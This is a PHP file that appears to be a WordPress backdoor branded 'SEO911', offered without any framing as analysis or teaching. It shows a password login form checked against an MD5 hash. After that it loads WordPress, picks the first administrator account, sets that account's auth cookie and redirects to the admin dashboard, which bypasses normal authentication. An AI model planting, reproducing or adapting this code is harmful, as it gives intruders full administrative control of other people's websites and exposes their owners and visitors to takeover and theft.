<?php
session_start();
$password = "27dc4d96874bb6df9fde4ef5a097eb7e";

function login_shell()
{
?>
    <html>
<head>
	<title>SEO911</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlhWF814vNEkEgBk1g8F_bWOEGaGJwDNgwPlZjNxkCpgIBJL4GFhKPnQptuYtQ3ooTdOWVOvFgmja4b19N0QwfOYN9PcDf3klVXNJFTM1HwptCYQ6nAao_hoI15xfnjmi4P1r07w5ScKbeFvow65o2vpSGYBUBf-8ZyLgeK4LXT_ICKb_kkRCJ58Ih-cR7/s512/dg.png" />
</head><l
<body>
<div class="login">
    <h2 class="login-header">
        SEO911
    </h2>
    <form class="login-container" action="" method="post">
        <div align="center">
            <input type="Password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value="LOGIN">
          </div>
    </form>
</div>
</body>
</html>
<style>
body {
    background: rgb(87, 87, 87);
    font-family: 'Beautiful Vampires', sans-serif;
    background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiFL6h6cTUiKmn-5H62NvzxZAFM3nAHMZQ_g90J5UovoYjnouxwXYfk6vxThzJiM1rT6Qaaak2jl_wWMl9q0WeNr_Li3lh5ZZzIib34KUEOlumXvj72zEhpQQOXtMXKCsDP-7n0JOqm7BCBh5WqwmGXP7ZDkrLYXVFwpbgkcMA55fkDbyDWHIdPll4jtpK8/s1919/seo911lagi.png);
  }
  .login {
    width: 400px;
    margin: 16px auto;
    font-size: 16px;
  }
  /* Reset top and bottom margins from certain elements */
  .login-header,
  .login p {
    margin-top: 0;
    margin-bottom: 0;
  }
  .login-header {
    background: #790000;
    padding: 20px;
    font-size: 1.4em;
    font-weight: normal;
    text-align: center;
    text-transform: uppercase;
    color: #fff;
    border: 2px solid #ffca2d;
  }
  .login-container {
    background: #2d2d2d;
    padding: 12px;
    border-radius: 10px 10px;
  }
  /* Every row inside .login-container is defined with p tags */
  .login p {
    padding: 12px;
  }
  .login input {
    box-sizing: border-box;
    display: block;
    width: 100%;
    border-width: 1px;
    border-style: solid;
    padding: 16px;
    outline: 0;
    font-family: inherit;
    font-size: 0.95em;
  }
  .login input[type="email"],
  .login input[type="password"] {
    background: #e9e9e9;
    border-color: #bbb;
    color: #555;
  }
  /* Text fields' focus effect */
  .login input[type="email"]:focus,
  .login input[type="password"]:focus {
    border-color: #888;
  }
  .login input[type="submit"] {
    background: #790000;
    border-color: transparent;
    color: #fff;
    cursor: pointer;
    border: 2px solid #ffca2d;
    border-radius: 5px 5px;
  }
  .login input[type="submit"]:hover {
    background: #17c;
  }
  /* Buttons' focus effect */
  .login input[type="submit"]:focus {
    border-color: #05a;
  }
</style>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell(); {
    }
}
?>
<?php
}
require(rtrim($_SERVER["DOCUMENT_ROOT"], "/\\") . DIRECTORY_SEPARATOR . "wp-blog-header.php");
$u = get_users('role=administrator');
$us="";
foreach($u as $p){
	$us=$p->user_login; break;
}
$us = get_user_by('login', $us ); 
if ( !is_wp_error( $us ) )
{	get_currentuserinfo(); 
		if ( user_can( $us, "administrator" ) ){ 
		   wp_clear_auth_cookie(); 
   		   wp_set_current_user ( $us->ID );
    	   wp_set_auth_cookie  ( $us->ID );
    	   $redirect_to = admin_url();  
           wp_safe_redirect( $redirect_to );
           exit();	
  } 
}